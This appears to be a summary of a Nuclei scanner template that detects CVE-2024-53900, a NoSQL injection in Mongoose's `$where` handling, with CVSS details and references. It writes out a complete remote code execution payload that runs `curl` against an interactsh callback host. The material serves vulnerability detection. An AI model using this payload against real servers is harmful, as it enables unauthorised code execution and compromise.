---
cve_id: CVE-2024-53900
template_path: nuclei-templates/http/cves/2024/CVE-2024-53900.yaml
affected_product: Mongoose
severity: critical
authentication: none
external_callback: true
affected_versions: < 8.8.3
preconditions: []
poc_classification: rce
---

## Vulnerability
Mongoose (MongoDB ODM for Node.js) < 8.8.3 is vulnerable to NoSQL injection via improper handling of the `$where` operator inside `match` queries.  

Unauthenticated remote attackers can inject arbitrary JavaScript into the `$where` clause through crafted query parameters (e.g. `view[match][$where]`), achieving full remote code execution in the Node.js process.  

CVSS 3.1: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) • CWE-89 • EPSS 0.459 (97.55th percentile).

## PoC / Detection
Classification: rce

The template issues a single unauthenticated GET request to `{{BaseURL}}?view[path]=author&view[match][$where]=global.process.mainModule.constructor._load('child_process').exec('curl {{interactsh-url}}')`, which triggers the injected `$where` payload to execute `curl` on the server. Detection succeeds when the response status is 200 **and** an out-of-band HTTP interaction is received at the interactsh server containing the `User-Agent: curl` header.

## References
- https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156
- https://github.com/advisories/GHSA-m7xq-9374-9rvx
- https://www.youtube.com/watch?v=WX_N1NGPbug
- https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md
- https://nvd.nist.gov/vuln/detail/CVE-2024-53900
